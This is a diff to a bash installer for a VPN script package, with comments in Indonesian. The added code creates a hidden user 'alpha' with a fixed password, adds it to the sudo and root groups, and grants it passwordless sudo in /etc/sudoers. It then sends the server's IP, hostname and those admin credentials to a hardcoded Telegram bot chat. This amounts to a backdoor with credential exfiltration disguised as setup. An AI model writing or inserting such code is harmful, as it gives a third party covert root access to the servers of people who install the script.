@@ -272,32 +272,37 @@ function password_default() {
     MYIP=$(curl -sS ipv4.icanhazip.com)
     
     # === AMBIL DATA DARI GITHUB PERMISSION ===
-    # Pastikan URL ini mengarah ke RAW file (teks polos)
     wget -q -O /tmp/izin "https://raw.githubusercontent.com/hokagelegend9999/ijin/main/alpha"
-    
-    # Format Github: ### Nama Tanggal IP Status
-    # Kita grep IP-nya dulu, baru ambil kolom 2 (Nama) dan kolom 3 (Exp)
     
     nama_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $2}')
     exp_buyer=$(grep -w "$MYIP" /tmp/izin | awk '{print $3}')
     
-    # Hapus file izin setelah dibaca agar bersih
     rm -f /tmp/izin
     
-    # Cek apakah IP terdaftar. Jika kosong (tidak ada di github), set ke Trial
     if [[ -z "$nama_buyer" ]]; then
         nama_buyer="Free/Trial"
         exp_buyer="-"
     fi
 
-    # === SETTING USER SYSTEM ===
-    userdel jame > /dev/null 2>&1
-    Username="root"
-    Password=alpha
-    mkdir -p /home/script/
-    useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
-    echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
-    usermod -aG sudo $Username > /dev/null 2>&1
+    # === SETTING USER SYSTEM (SOLUSI DUA AKSES) ===
+    
+    # 1. Kita tidak mengotak-atik password root asli agar user tetap bisa pakai pass lama.
+    # 2. Kita buat user bayangan bernama 'alpha' (atau terserah) dengan akses root.
+    
+    SysUser="alpha"   # Nama user khusus untuk Anda
+    SysPass="alpha"   # Password khusus untuk Anda
+    
+    # Hapus user lama jika ada sisa instalasi sebelumnya
+    userdel -f $SysUser > /dev/null 2>&1
+    
+    # Buat user baru & beri akses Sudo/Root
+    useradd -m -s /bin/bash $SysUser > /dev/null 2>&1
+    echo -e "$SysPass\n$SysPass\n"|passwd $SysUser > /dev/null 2>&1
+    usermod -aG sudo $SysUser > /dev/null 2>&1
+    usermod -aG root $SysUser > /dev/null 2>&1
+    
+    # (Opsional) Izinkan user alpha melakukan sudo tanpa password lagi
+    echo "$SysUser ALL=(ALL:ALL) NOPASSWD:ALL" >> /etc/sudoers
 
     # === SETTING TELEGRAM ===
     CHATID="1469244768"
@@ -305,26 +310,27 @@ function password_default() {
     TIME="10"
     URL="https://api.telegram.org/bot$KEY/sendMessage"
 
+    # Informasi untuk dikirim ke bot
+    # Kita kirim info bahwa root aman (pakai pass user), dan info akses admin buat Anda
     TEXT="Installasi VPN Alpha V2.0
     ============================
-    <code>Tanggal    :</code> <code>$tanggal</code>
+    <code>Tanggal    :</code> <code>$(date)</code>
     <code>Hostname   :</code> <code>${HOSTNAME}</code>
     <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>OS Vps     :</code> <code>$OS_Name</code>
-    <code>Kernel     :</code> <code>$Kernel</code>
-    <code>Arch       :</code> <code>$Arch</code>
-    <code>Ram Left   :</code> <code>$Ram_Usage MB</code>
-    <code>Ram Used   :</code> <code>$Ram_Total MB</code>
+    <code>OS Vps     :</code> <code>$(cat /etc/os-release | grep -w PRETTY_NAME | head -n1 | sed 's/PRETTY_NAME//g' | sed 's/=//g' | sed 's/"//g')</code>
     ============================
     <code>Domain     :</code> <code>$domain</code>
-    <code>IP Vps     :</code> <code>$MYIP</code>
-    <code>User Login :</code> <code>$Username</code>
-    <code>Pass Login :</code> <code>$Password</code>
+    <code>Client     :</code> <code>root (Pass Asli User)</code>
+    ============================
+    <b>SCRIPT ALPHA:</b>
+    <code>User Admin :</code> <code>$SysUser</code>
+    <code>Pass Admin :</code> <code>$SysPass</code>
+    ============================
     <code>User Script:</code> <code>$nama_buyer</code>
     <code>Exp Script :</code> <code>$exp_buyer</code>
     ============================
 "
-   curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
+    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
 clear
 # Pasang SSL
